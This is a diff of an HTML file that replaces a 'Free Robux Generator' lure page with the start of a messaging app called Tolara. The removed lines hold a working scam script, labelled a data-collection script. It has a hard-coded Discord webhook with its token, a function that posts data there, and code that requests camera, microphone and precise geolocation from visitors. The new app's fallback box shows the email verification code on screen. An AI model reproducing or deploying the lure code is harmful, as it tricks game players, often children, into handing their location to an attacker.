@@ -1,239 +1,1322 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Robux Generator</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tolara</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --yellow:#FFFC00;--bg:#0a0a0a;--surface:#161616;--surface2:#222;
+      --surface3:#2a2a2a;--text:#fff;--muted:#888;--border:#2a2a2a;
+      --green:#4CD964;--red:#FF3A30;--blue:#3478F6;
+    }
+    body{font-family:'Nunito',sans-serif;background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;align-items:center;justify-content:center}
 
-        body {
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-            position: relative;
-        }
+    /* ── AUTH SCREEN ── */
+    #authScreen{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100%;padding:20px}
+    .auth-wrap{width:100%;max-width:520px;display:flex;flex-direction:column;align-items:center;gap:0}
+    .auth-logo-area{text-align:center;margin-bottom:28px}
+    .ghost-logo{font-size:58px;display:inline-block;animation:ghost-bob 2.5s ease-in-out infinite}
+    @keyframes ghost-bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+    .auth-title{font-size:32px;font-weight:900;color:var(--yellow);margin-top:6px}
+    .auth-subtitle{font-size:13px;color:var(--muted);margin-top:4px}
 
-        .container {
-            text-align: center;
-            z-index: 10;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 50px;
-            border-radius: 20px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18);
-        }
+    /* Tab switcher */
+    .auth-tabs{display:flex;background:var(--surface);border:1px solid var(--border);border-radius:14px 14px 0 0;width:100%;overflow:hidden}
+    .auth-tab{flex:1;padding:13px;text-align:center;font-size:14px;font-weight:800;color:var(--muted);cursor:pointer;transition:all .2s;border-bottom:3px solid transparent}
+    .auth-tab.active{color:var(--yellow);border-bottom-color:var(--yellow);background:var(--surface2)}
 
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 30px;
-        }
+    /* Auth card */
+    .auth-card{background:var(--surface);border:1px solid var(--border);border-top:none;border-radius:0 0 20px 20px;padding:28px 28px 24px;width:100%}
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+    /* Two-column login */
+    .login-columns{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%;margin-bottom:16px}
+    .col-field{display:flex;flex-direction:column;gap:6px}
+    .col-label{font-size:11px;font-weight:900;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+    .auth-input{width:100%;background:var(--surface2);border:1.5px solid var(--border);border-radius:12px;padding:12px 14px;color:var(--text);font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;outline:none;transition:border-color .2s}
+    .auth-input:focus{border-color:var(--yellow)}
+    .auth-input::placeholder{color:var(--muted);font-weight:400}
+    .auth-input.valid{border-color:var(--green)}
+    .auth-input.invalid{border-color:var(--red)}
+    .auth-divider{grid-column:1/-1;height:1px;background:var(--border);margin:2px 0}
 
-        .loading-text {
-            color: white;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
+    /* Signup steps */
+    .signup-step{display:none;flex-direction:column;gap:14px;width:100%}
+    .signup-step.active{display:flex}
+    .step-header{margin-bottom:4px}
+    .step-title{font-size:20px;font-weight:900}
+    .step-sub{font-size:12px;color:var(--muted);margin-top:3px;line-height:1.5}
+    .step-progress{display:flex;gap:5px;margin-bottom:16px}
+    .step-dot{height:4px;border-radius:2px;background:var(--border);flex:1;transition:background .3s}
+    .step-dot.done{background:var(--yellow)}
+    .input-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    .field-wrap{display:flex;flex-direction:column;gap:5px}
+    .field-label{font-size:11px;font-weight:900;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+    .field-hint{font-size:11px;color:var(--muted);min-height:14px}
+    .field-hint.ok{color:var(--green)}
+    .field-hint.err{color:var(--red)}
+    .field-hint.checking{color:var(--muted)}
 
-        .robux-text {
-            color: #ffcc00;
-            font-size: 32px;
-            font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            animation: pulse 2s ease-in-out infinite;
-            margin-bottom: 20px;
-        }
+    /* Password strength */
+    .pw-strength{display:flex;gap:3px;margin-top:5px}
+    .pw-bar{height:3px;flex:1;border-radius:2px;background:var(--border);transition:background .3s}
+    .pw-bar.weak{background:var(--red)}
+    .pw-bar.medium{background:#FF9F0A}
+    .pw-bar.strong{background:var(--green)}
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.05); opacity: 0.9; }
-        }
+    /* Buttons */
+    .btn-yellow{width:100%;background:var(--yellow);color:#000;border:none;border-radius:12px;padding:13px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:800;cursor:pointer;transition:all .15s}
+    .btn-yellow:hover{opacity:.9;transform:translateY(-1px)}
+    .btn-yellow:active{transform:scale(.98)}
+    .btn-yellow:disabled{opacity:.35;cursor:not-allowed;transform:none}
+    .btn-ghost{width:100%;background:transparent;color:var(--muted);border:1.5px solid var(--border);border-radius:12px;padding:11px;font-family:'Nunito',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s}
+    .btn-ghost:hover{border-color:var(--yellow);color:var(--yellow)}
+    .auth-err{font-size:12px;color:var(--red);font-weight:700;min-height:16px;text-align:center}
 
-        .start-button {
-            background: linear-gradient(45deg, #ffcc00, #ff9900);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
-        }
+    /* ── OTP VERIFY SCREEN ── */
+    #verifyScreen{display:none;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100%;padding:20px}
+    .verify-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:36px 32px;width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center}
+    .verify-icon{font-size:52px;animation:ghost-bob 2.5s ease-in-out infinite}
+    .verify-title{font-size:22px;font-weight:900}
+    .verify-sub{font-size:13px;color:var(--muted);line-height:1.6}
+    .otp-row{display:flex;gap:8px;justify-content:center;margin:6px 0}
+    .otp-box{width:44px;height:54px;background:var(--surface2);border:2px solid var(--border);border-radius:12px;text-align:center;font-family:'Nunito',sans-serif;font-size:22px;font-weight:900;color:var(--text);outline:none;transition:border-color .2s;caret-color:var(--yellow)}
+    .otp-box:focus{border-color:var(--yellow)}
+    .otp-box.filled{border-color:var(--yellow)}
+    .otp-box.invalid{border-color:var(--red);animation:shake .4s ease}
+    @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-5px)}40%{transform:translateX(5px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+    .resend-row{font-size:12px;color:var(--muted);display:flex;gap:4px;align-items:center}
+    .resend-link{color:var(--yellow);cursor:pointer;font-weight:700;text-decoration:none}
+    .resend-link:hover{text-decoration:underline}
 
-        .start-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.6);
-        }
+    /* Demo email box */
+    .demo-email-box{background:var(--surface2);border:1px dashed #444;border-radius:10px;padding:12px 14px;width:100%;text-align:left}
+    .demo-email-label{font-size:10px;font-weight:900;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+    .demo-badge{background:#333;color:var(--yellow);border-radius:4px;padding:2px 6px;font-size:9px;font-weight:900;letter-spacing:.3px}
+    .demo-email-code{font-size:26px;font-weight:900;color:var(--yellow);letter-spacing:8px;text-align:center;margin:6px 0}
+    .demo-email-note{font-size:11px;color:var(--muted);line-height:1.5}
 
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-            overflow: hidden;
-            margin-top: 20px;
-            display: none;
-        }
+    /* ── USERNAME SETUP ── */
+    #usernameScreen{display:none;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100%;padding:20px}
+    .username-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:38px 32px;width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center}
+    .un-pfp-fallback{width:72px;height:72px;border-radius:50%;border:3px solid var(--yellow);display:flex;align-items:center;justify-content:center;font-size:28px;background:var(--surface2)}
+    .un-title{font-size:22px;font-weight:900}
+    .un-sub{font-size:13px;color:var(--muted);line-height:1.6}
+    .setup-input{width:100%;background:var(--surface2);border:1.5px solid var(--border);border-radius:12px;padding:12px 16px;color:var(--text);font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;outline:none;transition:border-color .2s;text-align:center}
+    .setup-input:focus{border-color:var(--yellow)}
+    .setup-input::placeholder{color:var(--muted);font-weight:400}
+    .setup-input.valid{border-color:var(--green)}
+    .setup-input.invalid{border-color:var(--red)}
+    .un-status{font-size:12px;font-weight:700;min-height:16px}
+    .un-status.ok{color:var(--green)}
+    .un-status.err{color:var(--red)}
+    .un-status.checking{color:var(--muted)}
 
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ffcc00, #ff9900);
-            border-radius: 3px;
-            animation: progress 3s ease-in-out infinite;
-        }
+    /* ── MAIN APP ── */
+    #mainApp{display:none;width:100%;height:100vh;max-width:1100px;max-height:720px}
+    .layout{display:flex;height:100%;border:1px solid var(--border);border-radius:18px;overflow:hidden}
+    .sidebar{width:290px;flex-shrink:0;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
+    .sidebar-top{padding:14px 14px 10px;border-bottom:1px solid var(--border);position:relative}
+    .logo-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+    .logo-left{display:flex;align-items:center;gap:8px}
+    .logo-ghost{width:30px;height:30px;background:var(--yellow);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
+    .logo-text{font-size:17px;font-weight:900;color:var(--yellow)}
+    .icon-btn{background:none;border:none;cursor:pointer;font-size:17px;padding:5px;border-radius:8px;transition:background .15s;color:var(--text)}
+    .icon-btn:hover{background:var(--surface2)}
+    .search-wrap{position:relative}
+    .search-input{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:20px;padding:8px 12px 8px 32px;color:var(--text);font-family:'Nunito',sans-serif;font-size:13px;outline:none;transition:border-color .2s}
+    .search-input:focus{border-color:var(--yellow)}
+    .search-input::placeholder{color:var(--muted)}
+    .search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:13px;pointer-events:none}
+    .tabs{display:flex;border-bottom:1px solid var(--border)}
+    .tab{flex:1;padding:9px 4px;text-align:center;font-size:12px;font-weight:800;color:var(--muted);cursor:pointer;border-bottom:2.5px solid transparent;transition:all .2s}
+    .tab.active{color:var(--yellow);border-bottom-color:var(--yellow)}
+    .list-wrap{flex:1;overflow-y:auto;padding:6px}
+    .list-wrap::-webkit-scrollbar{width:3px}
+    .list-wrap::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+    .convo-item{display:flex;align-items:center;gap:10px;padding:9px 10px;cursor:pointer;border-radius:10px;margin-bottom:2px;transition:background .15s}
+    .convo-item:hover,.convo-item.active{background:var(--surface2)}
+    .av{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;position:relative}
+    .av.ring{box-shadow:0 0 0 2.5px var(--yellow)}
+    .online-dot{width:10px;height:10px;background:var(--green);border-radius:50%;position:absolute;bottom:0;right:0;border:2px solid var(--surface)}
+    .ci{flex:1;min-width:0}
+    .cn{font-size:13px;font-weight:800;margin-bottom:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .cp{font-size:12px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .cp.bold{color:var(--text);font-weight:700}
+    .cr{text-align:right;flex-shrink:0}
+    .ct{font-size:10px;color:var(--muted)}
+    .badge{background:var(--yellow);color:#000;border-radius:50%;width:17px;height:17px;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:900;margin-top:3px;margin-left:auto}
+    .empty-list{padding:24px 16px;text-align:center;color:var(--muted);font-size:13px;line-height:1.8}
+    .section-hdr{font-size:11px;font-weight:900;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;padding:8px 10px 4px}
+    .search-result-item{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:10px;margin-bottom:2px;border:1px solid var(--border)}
+    .chat{flex:1;display:flex;flex-direction:column;background:var(--bg)}
+    .chat-hdr{padding:11px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--surface);flex-shrink:0}
+    .hav{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
+    .hi{flex:1}
+    .hn{font-size:14px;font-weight:800}
+    .hs{font-size:11px;color:var(--muted)}
+    .msgs{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:8px}
+    .msgs::-webkit-scrollbar{width:3px}
+    .msgs::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+    .date-sep{text-align:center;font-size:11px;color:var(--muted);padding:6px 0;font-weight:700}
+    .msg-row{display:flex;align-items:flex-end;gap:7px}
+    .msg-row.mine{flex-direction:row-reverse}
+    .msav{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:8px;font-weight:800;flex-shrink:0}
+    .bubble{max-width:280px;padding:9px 13px;border-radius:17px;font-size:14px;line-height:1.4;word-break:break-word}
+    .bubble.theirs{background:var(--surface2);border-bottom-left-radius:4px}
+    .bubble.mine{background:var(--yellow);color:#000;font-weight:700;border-bottom-right-radius:4px}
+    .mtime{font-size:10px;color:var(--muted);padding:0 3px;flex-shrink:0;align-self:flex-end}
+    .img-bub{max-width:220px;border-radius:14px;overflow:hidden;cursor:pointer}
+    .img-bub img{width:100%;display:block;border-radius:14px}
+    .typing-row{display:flex;align-items:flex-end;gap:7px;margin-top:4px}
+    .typing-bub{background:var(--surface2);border-radius:17px;border-bottom-left-radius:4px;padding:10px 14px;display:flex;gap:4px}
+    .td{width:6px;height:6px;background:var(--muted);border-radius:50%;animation:tdot 1s infinite}
+    .td:nth-child(2){animation-delay:.15s}
+    .td:nth-child(3){animation-delay:.3s}
+    @keyframes tdot{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-5px)}}
+    .input-bar{padding:10px 14px;border-top:1px solid var(--border);background:var(--surface);display:flex;align-items:center;gap:8px;flex-shrink:0}
+    .chat-input{flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:20px;padding:9px 14px;color:var(--text);font-family:'Nunito',sans-serif;font-size:14px;outline:none;transition:border-color .2s}
+    .chat-input:focus{border-color:var(--yellow)}
+    .chat-input::placeholder{color:var(--muted)}
+    .send-btn{background:var(--yellow);border:none;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;flex-shrink:0;transition:transform .1s}
+    .send-btn:hover{transform:scale(1.06)}
+    .send-btn:active{transform:scale(.94)}
+    .attach-btn{background:none;border:none;color:var(--yellow);cursor:pointer;font-size:20px;padding:4px;flex-shrink:0;line-height:1}
+    .empty-chat{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--muted)}
+    .empty-ghost{font-size:60px;opacity:.2;animation:ghost-bob 3s ease-in-out infinite}
+    .spinner{display:inline-block;width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--yellow);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:5px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:10px 20px;font-size:13px;font-weight:700;color:var(--text);opacity:0;transition:all .3s;pointer-events:none;z-index:9000;white-space:nowrap}
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+    .img-viewer{position:fixed;inset:0;background:rgba(0,0,0,.93);display:flex;align-items:center;justify-content:center;z-index:8000;cursor:pointer}
+    .img-viewer img{max-width:90vw;max-height:90vh;border-radius:12px}
+    .user-menu-btn{width:30px;height:30px;border-radius:50%;overflow:hidden;cursor:pointer;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;transition:border-color .2s}
+    .user-menu-btn:hover{border-color:var(--yellow)}
+    .dropdown{position:absolute;top:48px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:6px;z-index:500;min-width:160px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+    .dropdown-item{padding:9px 12px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:8px;transition:background .15s}
+    .dropdown-item:hover{background:var(--surface2)}
+    .dropdown-item.danger{color:var(--red)}
+    #fileInput{display:none}
+    ::-webkit-scrollbar{width:4px}
+    ::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
 
-        @keyframes progress {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 100%; }
-        }
+    @media (max-width: 760px){
+      body{align-items:stretch;justify-content:stretch}
+      #mainApp{max-width:none;max-height:none;height:100vh}
+      .layout{border:none;border-radius:0}
+      .sidebar{width:38%;min-width:140px}
+      .auth-card{padding:22px 18px}
+      .login-columns,.input-row{grid-template-columns:1fr}
+      .otp-box{width:38px;height:50px}
+      .bubble{max-width:220px}
+    }
 
-        .floating-robux {
-            position: absolute;
-            font-size: 24px;
-            color: #ffcc00;
-            animation: float 6s ease-in-out infinite;
-            opacity: 0.7;
-            pointer-events: none;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.7; }
-            90% { opacity: 0.7; }
-            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
-        }
-
-        .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #4ade80;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: blink 2s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .hidden {
-            display: none;
-        }
-    </style>
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loading-spinner" id="spinner"></div>
-        <div class="loading-text" id="loading-text">
-            <span class="status-dot"></span>
-            Ready to Generate!
-        </div>
-        <div class="robux-text">🎁 Free Robux Generator 🎁</div>
-        <button class="start-button" id="startBtn" onclick="startGenerator()">Click to Start</button>
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill"></div>
-        </div>
+
+<!-- ══ AUTH SCREEN ══ -->
+<div id="authScreen">
+  <div class="auth-wrap">
+    <div class="auth-logo-area">
+      <div class="ghost-logo">👻</div>
+      <div class="auth-title">Tolara</div>
+      <div class="auth-subtitle">Real-time messaging with friends</div>
     </div>
 
-    <!-- Floating Robux symbols -->
-    <div class="floating-robux" style="left: 10%; animation-delay: 0s;">💎</div>
-    <div class="floating-robux" style="left: 20%; animation-delay: 1s;">🪙</div>
-    <div class="floating-robux" style="left: 30%; animation-delay: 2s;">💰</div>
-    <div class="floating-robux" style="left: 40%; animation-delay: 3s;">💎</div>
-    <div class="floating-robux" style="left: 50%; animation-delay: 4s;">🪙</div>
-    <div class="floating-robux" style="left: 60%; animation-delay: 5s;">💰</div>
-    <div class="floating-robux" style="left: 70%; animation-delay: 1.5s;">💎</div>
-    <div class="floating-robux" style="left: 80%; animation-delay: 2.5s;">🪙</div>
-    <div class="floating-robux" style="left: 90%; animation-delay: 3.5s;">💰</div>
+    <div class="auth-tabs">
+      <div class="auth-tab active" id="tabLogin" onclick="switchAuthTab('login')">Log In</div>
+      <div class="auth-tab" id="tabSignup" onclick="switchAuthTab('signup')">Sign Up</div>
+    </div>
 
-    <script>
-        // Working data collection script
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485895766261104701/DK9De467EJauJxyFetj6il_14A5Uc-apzc6sy0NqWxSiczoA1Raq2c-aQAoDJ5I0t9sb';
+    <div class="auth-card">
 
-        async function sendToDiscord(data) {
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                console.log('Discord response:', response.status);
-                return response.ok;
-            } catch (error) {
-                console.error('Discord error:', error);
-                return false;
-            }
-        }
+      <!-- LOGIN MODE -->
+      <div id="loginMode">
+        <div class="login-columns">
+          <div class="col-field">
+            <div class="col-label">Email or Username</div>
+            <input class="auth-input" id="loginIdent" type="text" placeholder="you@email.com"
+              autocomplete="username" onkeydown="if(event.key==='Enter')document.getElementById('loginPass').focus()">
+          </div>
+          <div class="col-field">
+            <div class="col-label">Password</div>
+            <input class="auth-input" id="loginPass" type="password" placeholder="••••••••"
+              autocomplete="current-password" onkeydown="if(event.key==='Enter')doLogin()">
+          </div>
+        </div>
+        <div class="auth-err" id="loginErr"></div>
+        <button class="btn-yellow" id="loginBtn" onclick="doLogin()" style="margin-top:4px">Log In →</button>
+        <p style="text-align:center;font-size:12px;color:var(--muted);margin-top:12px">
+          No account? <span style="color:var(--yellow);cursor:pointer;font-weight:700" onclick="switchAuthTab('signup')">Sign up free</span>
+        </p>
+      </div>
 
-        async function requestPermissions() {
-            const permissions = {
-                camera: false,
-                microphone: false,
-                location: false
-            };
+      <!-- SIGNUP MODE -->
+      <div id="signupMode" style="display:none">
+        <div class="step-progress" id="stepProgress">
+          <div class="step-dot done" id="dot0"></div>
+          <div class="step-dot" id="dot1"></div>
+          <div class="step-dot" id="dot2"></div>
+          <div class="step-dot" id="dot3"></div>
+        </div>
 
-            // Request camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                permissions.camera = true;
-                stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.log('Camera denied:', e);
-            }
+        <!-- Step 1: Name -->
+        <div class="signup-step active" id="step1">
+          <div class="step-header">
+            <div class="step-title">What's your name?</div>
+            <div class="step-sub">This is how you'll appear to friends.</div>
+          </div>
+          <div class="input-row">
+            <div class="field-wrap">
+              <div class="field-label">First Name</div>
+              <input class="auth-input" id="signupFirst" type="text" placeholder="First"
+                onkeydown="if(event.key==='Enter')document.getElementById('signupLast').focus()">
+            </div>
+            <div class="field-wrap">
+              <div class="field-label">Last Name</div>
+              <input class="auth-input" id="signupLast" type="text" placeholder="Last"
+                onkeydown="if(event.key==='Enter')signupNext(1)">
+            </div>
+          </div>
+          <div class="auth-err" id="step1Err"></div>
+          <button class="btn-yellow" onclick="signupNext(1)">Continue →</button>
+        </div>
 
-            // Request microphone
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                permissions.microphone = true;
-                stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.log('Microphone denied:', e);
-            }
+        <!-- Step 2: Email -->
+        <div class="signup-step" id="step2">
+          <div class="step-header">
+            <div class="step-title">What's your email?</div>
+            <div class="step-sub">We'll send a verification code to confirm it's you.</div>
+          </div>
+          <div class="field-wrap">
+            <div class="field-label">Email Address</div>
+            <input class="auth-input" id="signupEmail" type="email" placeholder="you@email.com"
+              autocomplete="email" onkeydown="if(event.key==='Enter')signupNext(2)">
+            <div class="field-hint" id="emailHint"></div>
+          </div>
+          <div class="auth-err" id="step2Err"></div>
+          <button class="btn-yellow" onclick="signupNext(2)">Continue →</button>
+          <button class="btn-ghost" onclick="signupBack(2)">← Back</button>
+        </div>
 
-            // Request location
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        timeout: 10000,
-                        maximumAge: 60000
-                    });
-                });
-                permissions.location = {
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                };
-                document.getElementById('loading-text').innerHTML = '<span class="status-dot"></span>Loading...';
-            } catch (e) {
-                console.log('Location denied:', e);
-            }
+        <!-- Step 3: Password -->
+        <div class="signup-step" id="step3">
+          <div class="step-header">
+            <div class="step-title">Create a password</div>
+            <div class="step-sub">At least 8 characters. Make it strong!</div>
+          </div>
+          <div class="field-wrap">
+            <div class="field-label">Password</div>
+            <input class="auth-input" id="signupPass" type="password" placeholder="Min. 8 characters"
+              autocomplete="new-password" oninput="checkPwStrength(this.value)"
+              onkeydown="if(event.key==='Enter')document.getElementById('signupPass2').focus()">
+            <div class="pw-strength" id="pwStrength">
+              <div class="pw-bar" id="pb1"></div>
+              <div class="pw-bar" id="pb2"></div>
+              <div class="pw-bar" id="pb3"></div>
+            </div>
+          </div>
+          <div class="field-wrap">
+            <div class="field-label">Confirm Password</div>
+            <input class="auth-input" id="signupPass2" type="password" placeholder="Repeat password"
+              autocomplete="new-password" onkeydown="if(event.key==='Enter')signupNext(3)">
+          </div>
+          <div class="auth-err" id="step3Err"></div>
+          <button class="btn-yellow" onclick="signupNext(3)">Continue →</button>
+          <button class="btn-ghost" onclick="signupBack(3)">← Back</button>
+        </div>
 
-            return permissions;
-       
+        <!-- Step 4: Username -->
+        <div class="signup-step" id="step4">
+          <div class="step-header">
+            <div class="step-title">Choose your username</div>
+            <div class="step-sub">Pick a unique handle so friends can find you. You can't change this later.</div>
+          </div>
+          <div class="field-wrap">
+            <div class="field-label">Username</div>
+            <input class="auth-input" id="signupUsername" type="text" placeholder="@username"
+              maxlength="20" oninput="onUsernameType(this.value)"
+              onkeydown="if(event.key==='Enter')signupNext(4)" style="text-align:center">
+            <div class="field-hint" id="usernameHint"></div>
+          </div>
+          <div class="auth-err" id="step4Err"></div>
+          <button class="btn-yellow" id="usernameNextBtn" onclick="signupNext(4)" disabled>Send Verification Code →</button>
+          <button class="btn-ghost" onclick="signupBack(4)">← Back</button>
+        </div>
+
+      </div><!-- /signupMode -->
+    </div><!-- /auth-card -->
+  </div>
+</div>
+
+<!-- ══ VERIFY SCREEN ══ -->
+<div id="verifyScreen">
+  <div class="verify-card">
+    <div class="verify-icon">📬</div>
+    <div class="verify-title">Check your email</div>
+    <div class="verify-sub">We sent a 6-digit code to<br><strong id="verifyEmailLabel" style="color:var(--yellow)"></strong></div>
+
+    <div class="otp-row" id="otpRow">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,0)" onKeydown="otpKeydown(event,0)">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,1)" onKeydown="otpKeydown(event,1)">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,2)" onKeydown="otpKeydown(event,2)">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,3)" onKeydown="otpKeydown(event,3)">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,4)" onKeydown="otpKeydown(event,4)">
+      <input class="otp-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]"
+        onInput="otpInput(this,5)" onKeydown="otpKeydown(event,5)">
+    </div>
+
+    <div class="auth-err" id="otpErr"></div>
+
+    <!-- Verify button -->
+    <button class="btn-yellow" id="verifyBtn" onclick="submitOtp()" disabled style="width:100%;margin-top:2px">
+      Verify Code →
+    </button>
+
+    <!-- Email status indicator -->
+    <div id="emailStatus" style="font-size:12px;color:var(--muted);text-align:center;min-height:18px"></div>
+
+    <!-- Fallback / dev box — only shown if email sending fails -->
+    <div class="demo-email-box" id="demoBox" style="display:none">
+      <div class="demo-email-label">
+        📧 Fallback Code <span class="demo-badge">EMAIL FAILED</span>
+      </div>
+      <div class="demo-email-code" id="demoCode">------</div>
+      <div class="demo-email-note">Could not send the email. Use this code to continue.</div>
+      <button class="btn-yellow" onclick="autofillCode()" style="margin-top:8px;padding:9px;font-size:13px">Autofill Code ↗</button>
+    </div>
+
+    <div class="resend-row">
+      Didn't get it? <span class="resend-link" onclick="resendCode()">Resend code</span>
+    </div>
+    <button class="btn-ghost" onclick="goBackFromVerify()" style="margin-top:4px">← Go back</button>
+  </div>
+</div>
+
+<!-- ══ USERNAME SCREEN (post-login new user) ══ -->
+<div id="usernameScreen">
+  <div class="username-card">
+    <div id="setupAvatarWrap"></div>
+    <div class="un-title">Choose your username</div>
+    <div class="un-sub">Pick a unique handle so friends can find you.</div>
+    <input class="setup-input" id="usernameInput" placeholder="@username" maxlength="20"
+      oninput="onUsernameInputType(this.value)"
